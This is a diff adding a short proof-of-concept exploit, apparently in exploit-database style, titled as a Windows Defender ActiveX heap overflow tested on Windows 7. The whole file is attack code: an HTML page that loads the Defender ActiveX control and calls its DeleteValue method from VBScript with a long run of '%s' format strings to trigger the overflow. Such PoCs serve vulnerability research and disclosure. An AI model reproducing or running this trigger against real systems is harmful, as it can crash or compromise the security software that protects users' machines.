@@ -1,0 +1,20 @@
+#Exploits title :[Microsoft Windows Defender ActiveX Heap Overflow PoC]
+#tested on :[windows 7]
+#Microsoft Windows Defender
+
+<html>
+<object classid='clsid:07DD3249-A591-4949-8F20-09CD347C69DC' id='target' ></object>
+<script language='vbscript'>
+targetFile = "C:\Program Files\Windows Defender\MsMpCom.dll"
+prototype  = "Sub DeleteValue ( ByVal bstrKeyName As String ,  ByVal bstrValueName As String )"
+memberName = "DeleteValue"
+progid     = "MpComExportsLib.MsMpSimpleConfig"
+argCount   = 2
+ 
+arg1="defaultV"
+arg2="%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s"
+ 
+target.DeleteValue arg1 ,arg2 
+ 
+</script>
+
